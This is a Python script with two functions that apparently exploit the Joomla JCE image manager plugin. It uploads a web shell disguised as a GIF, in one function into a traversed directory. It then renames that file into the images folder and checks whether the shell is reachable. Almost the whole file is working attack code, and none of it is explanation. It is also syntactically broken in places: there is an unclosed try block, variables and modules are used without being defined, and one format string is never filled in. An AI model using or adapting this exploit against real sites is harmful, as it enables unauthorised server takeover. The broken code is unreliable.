import requests

def Com_Jce(target, headers):
    try:
        payload = {'Filedata': open(shell_gif, 'rb')}

        data ={
            'upload-dir' : '/',
            'upload-overwrite' : '0',
            'action' : 'upload'
        }

        Exp = target + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'

        rr = requests.post(Exp, files=payload, data=data, headers=headers)

        if "Orusula" in r.text or rr.status_code == 200:
            PrivMethod = {
                'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + shell_php.split('/')[1]+ "\",\"./../../images/Orusula.gif\"]}"
            }

            privExploit = target + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
            requests.post(privExploit, data=PrivMethod, timeout=5, headers=headers)
            try:
                VulnCheck = requests.get(target + '/images/orusula.gif', timeout=5, headers=headers)
                if 'Vuln!!' in VulnCheck.text:
                    print("[+] Com_Jce", target + '/images/orusula.gif')
                else:
                    print("[-] Com_Jce")
    except:
        print("[-] Com_Jce")



def com_jce(url,headers):
    s = requests.session()
    endpoint = url+"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
    data = {
            'upload-dir':'./../../',
            'upload-overwrite':0,
            'Filedata' : [open('shell/VulnX.gif','rb')],
            'action':'Upload',
    }
    content = s.post(endpoint,data,headers)
    path_shell = url + "/VulnX.gif"
    res=requests.get(path_shell, headers).text
    matches = re.findall(re.compile(r'/image/gif/'),res)
    if matches:
        print ('[+] com_jce ', path_shell)
    else: 
        print (' %s com_jce ')
